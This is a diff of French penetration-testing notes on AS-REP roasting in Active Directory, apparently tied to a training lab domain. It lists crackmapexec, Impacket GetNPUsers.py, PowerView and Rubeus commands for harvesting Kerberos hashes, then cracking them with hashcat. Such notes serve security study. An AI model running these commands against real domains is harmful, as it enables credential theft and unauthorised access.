@@ -11,6 +11,9 @@ Après obtention de cette liste, on pourra tenter de casser les mots de passe de
 ```powershell
 crackmapexec ldap  $TARGET -u "$AD_USER" -p "$AD_PASSWORD" --asreproast asrep.txt
 
+GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+
+# Powerview
 Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 
 .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat /domain:<domain>
@@ -18,7 +21,7 @@ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,use
 # A VERIFIER NE SEMBLE RIN AVOIR 0 FAIRE ICI
 # kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 
-GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+
 ```
 
 Cassage du mot de passe avec hashcat  : mode 18200
